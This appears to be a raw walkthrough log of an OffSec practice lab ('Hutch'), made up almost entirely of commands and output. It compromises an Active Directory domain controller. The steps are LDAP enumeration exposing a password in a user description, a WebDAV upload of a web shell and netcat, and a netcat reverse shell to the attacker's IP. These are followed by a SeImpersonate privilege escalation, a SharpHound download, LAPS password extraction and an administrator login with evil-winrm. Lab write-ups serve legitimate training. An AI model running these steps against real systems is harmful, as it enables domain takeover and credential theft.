PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/10.0
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|_  Server Date: Wed, 29 Jul 2026 12:30:13 GMT
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49769/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows




ldapsearch -x -H ldap://hutch.offsec -b "dc=hutch,dc=offsec" "(objectClass=user)"

# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20210216133934.0Z
uSNCreated: 12831
uSNChanged: 49179
name: Freddy McSorley
objectGUID:: TxilGIhMVkuei6KplCd8ug==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132489437036308102
lastLogoff: 0
lastLogon: 132579563744834908
pwdLastSet: 132489417058152751
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: fmcsorley
sAMAccountType: 805306368
userPrincipalName: fmcsorley@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132579563744834908
msDS-SupportedEncryptionTypes: 0

fmcsorley
CrabSharkJellyfish192


└─$ ldapsearch -x -H ldap://hutch.offsec -b "dc=hutch,dc=offsec" "(objectClass=user)" | grep -i -e "sAMAccountName" -e "description"
description: Built-in account for guest access to the computer/domain
sAMAccountName: Guest
sAMAccountName: rplacidi
sAMAccountName: opatry
sAMAccountName: ltaunton
sAMAccountName: acostello
sAMAccountName: jsparwell
sAMAccountName: oknee
sAMAccountName: jmckendry
sAMAccountName: avictoria
sAMAccountName: jfrarey
sAMAccountName: eaburrow
sAMAccountName: cluddy
sAMAccountName: agitthouse
description: Password set to CrabSharkJellyfish192 at user's request. Please c
sAMAccountName: fmcsorley
                              




└─$ netexec smb 192.168.245.122 -u fmcsorley -p 'CrabSharkJellyfish192' --shares
SMB         192.168.245.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.245.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192
SMB         192.168.245.122 445    HUTCHDC          [*] Enumerated shares
SMB         192.168.245.122 445    HUTCHDC          Share           Permissions     Remark
SMB         192.168.245.122 445    HUTCHDC          -----           -----------     ------
SMB         192.168.245.122 445    HUTCHDC          ADMIN$                          Remote Admin
SMB         192.168.245.122 445    HUTCHDC          C$                              Default share
SMB         192.168.245.122 445    HUTCHDC          IPC$            READ            Remote IPC
SMB         192.168.245.122 445    HUTCHDC          NETLOGON        READ            Logon server share
SMB         192.168.245.122 445    HUTCHDC          SYSVOL          READ            Logon server share

└─$ smbclient //192.168.245.122/SYSVOL  --user=fmcsorley --password='CrabSharkJellyfish192'
Try "help" to get a list of possible commands.
smb: \> LS
  .                                   D        0  Wed Nov  4 00:25:31 2020
  ..                                  D        0  Wed Nov  4 00:25:31 2020
  hutch.offsec                       Dr        0  Wed Nov  4 00:25:31 2020

		7706623 blocks of size 4096. 2742585 blocks available
smb: \> CD hutch.offsec
smb: \hutch.offsec\> ls
  .                                   D        0  Wed Nov  4 00:27:03 2020
  ..                                  D        0  Wed Nov  4 00:27:03 2020
  DfsrPrivate                      DHSr        0  Wed Nov  4 00:27:03 2020
  Policies                            D        0  Wed Nov  4 00:25:40 2020
  scripts                             D        0  Wed Nov  4 00:25:31 2020

but I cannot enter DfsrPrivate


└─$ davtest -url http://192.168.245.122 -auth fmcsorley:CrabSharkJellyfish192
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://192.168.245.122
********************************************************
NOTE	Random string for this session: dm2V7CP
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://192.168.245.122/DavTestDir_dm2V7CP
********************************************************
 Sending test files
PUT	cgi	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.cgi
PUT	pl	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.pl
PUT	html	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.html
PUT	cfm	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.cfm
PUT	php	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.php
PUT	asp	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.asp
PUT	jsp	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.jsp
PUT	aspx	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.aspx
PUT	txt	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.txt
PUT	shtml	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.shtml
PUT	jhtml	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.jhtml
********************************************************
 Checking for test file execution
EXEC	cgi	FAIL
EXEC	pl	FAIL
EXEC	html	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.html
EXEC	html	FAIL
EXEC	cfm	FAIL
EXEC	php	FAIL
EXEC	asp	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.asp
EXEC	asp	FAIL
EXEC	jsp	FAIL
EXEC	aspx	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.aspx
EXEC	aspx	FAIL
EXEC	txt	SUCCEED:	http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.txt
EXEC	txt	FAIL
EXEC	shtml	FAIL
EXEC	jhtml	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://192.168.245.122/DavTestDir_dm2V7CP
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.cgi
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.pl
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.html
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.cfm
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.php
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.asp
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.jsp
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.aspx
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.txt
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.shtml
PUT File: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.jhtml
Executes: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.html
Executes: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.asp
Executes: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.aspx
Executes: http://192.168.245.122/DavTestDir_dm2V7CP/davtest_dm2V7CP.txt


└─$ cadaver http://192.168.245.122                   
Authentication required for 192.168.245.122 on server `192.168.245.122':
Username: fmcsorley
Password: 
dav:/> help
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       rename     lock       unlock     discover   steal      showlocks  
 version    checkin    checkout   uncheckout history    label      propnames  
 chexec     propget    propdel    propset    search     set        open       
 close      echo       quit       unset      lcd        lls        lpwd       
 logout     help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye

└─$ cadaver http://192.168.245.122
Authentication required for 192.168.245.122 on server `192.168.245.122':
Username: fmcsorley
Password: 
dav:/> put cmd.php
Uploading cmd.php to `/cmd.php':
Progress: [=============================>] 100.0% of 35 bytes succeeded.
dav:/> put cmd.aspx
Uploading cmd.aspx to `/cmd.aspx':
Progress: [=============================>] 100.0% of 1547 bytes succeeded.

Program 
c:\windows\system32\cmd.exe

Arguments 
/c whoami

iis apppool\defaultapppool

/c systeminfo
System Type:               x64-based PC

dav:/> put nc64.exe
Uploading nc64.exe to `/nc64.exe':
Progress: [=============================>] 100.0% of 45272 bytes succeeded.


/c dir C:\inetpub\wwwroot


07/29/2026  06:46 AM    <DIR>          .
07/29/2026  06:46 AM    <DIR>          ..
11/03/2020  10:37 PM    <DIR>          aspnet_client
07/29/2026  06:44 AM             1,547 cmd.aspx
07/29/2026  06:41 AM                35 cmd.php
07/29/2026  06:38 AM    <DIR>          DavTestDir_dm2V7CP
11/03/2020  10:35 PM               703 iisstart.htm
11/03/2020  10:35 PM            99,710 iisstart.png
11/04/2020  12:49 PM             1,241 index.aspx
07/29/2026  06:46 AM            45,272 nc64.exe


/c  C:\inetpub\wwwroot\nc64.exe 192.168.45.176 8821 -e cmd

└─$ nc -nvlp 8821  
listening on [any] 8821 ...
connect to [192.168.45.176] from (UNKNOWN) [192.168.245.122] 50180
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool


C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

SeImpersonatePrivilege

PS C:\Users\Public> .\p.exe -c cmd -i
.\p.exe -c cmd -i
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
hutch\hutchdc$

PS C:\Users\Public> wget http://192.168.45.176/SharpHound.exe -o s.exe
wget http://192.168.45.176/SharpHound.exe -o s.exe
PS C:\Users\Public> .\s.exe -c All 

-a----        7/29/2026   7:25 AM          31354 20260729072512_BloodHound.zip 


fmcsorley --ReadLAPSPassword --> HUTCHDC 



└─$ bloodyad --host 192.168.245.122 -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

distinguishedName: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
ms-Mcs-AdmPwd: x3237x47s1-E9Y
ms-Mcs-AdmPwdExpirationTime: 134324072130724236


└─$ nxc ldap 192.168.245.122 -u fmcsorley -p CrabSharkJellyfish192 -M laps
[*] Initializing LDAP protocol database
LDAP        192.168.245.122 389    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
LDAP        192.168.245.122 389    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192
LAPS        192.168.245.122 389    HUTCHDC          [*] Getting LAPS Passwords
LAPS        192.168.245.122 389    HUTCHDC          Computer:HUTCHDC$ User:                Password:x3237x47s1-E9Y

└─$ evil-winrm -i 192.168.245.122 -u administrator -p 'x3237x47s1-E9Y'    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hutch\administrator
